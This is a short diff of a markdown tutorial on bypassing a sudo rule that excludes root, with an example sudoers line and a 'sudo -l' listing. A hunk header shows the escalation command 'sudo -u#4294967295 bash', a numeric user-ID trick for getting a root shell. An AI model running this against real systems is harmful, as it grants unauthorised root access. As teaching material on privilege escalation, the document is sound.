@@ -24,6 +24,8 @@ bob    (ALL, !root) /usr/bin/id
 Then user bob can run vi with any other user except root.
 ```
 If you don't have Permission then you can Identify by typing "sudo -l"
+
+Note: User must be of sudoers group.
 ```
 lucy@ubuntu:/home/debian$ sudo -l
 Matching Defaults entries for lucy on this host:
@@ -46,7 +48,7 @@ sudo -u#4294967295 bash
 ## Didn't work, When I used /usr/bin/bash to execute Accept root
 
 ```
-lucy    ALL=(ALL, !root)        /usr/bin/id
+lucy    ALL=(ALL, !root)        /usr/bin/bash
 ```
 
 ```
